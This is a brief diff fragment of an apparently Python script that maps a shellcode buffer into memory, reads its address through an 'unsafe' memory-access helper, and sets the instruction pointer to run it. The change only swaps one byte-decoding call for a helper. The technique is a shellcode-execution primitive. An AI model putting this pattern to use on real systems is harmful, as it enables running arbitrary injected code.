@@ -12,6 +12,6 @@ mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, pro
 mm.write(shellcode)
 
 mm_addr = unsafe.addrof(mm)
-shellcode_addr = int.from_bytes(mem[mm_addr+16:mm_addr+16+8], "little")
+shellcode_addr = unsafe.u64(mem[mm_addr+16:mm_addr+16+8])
 
 unsafe.setrip(shellcode_addr)
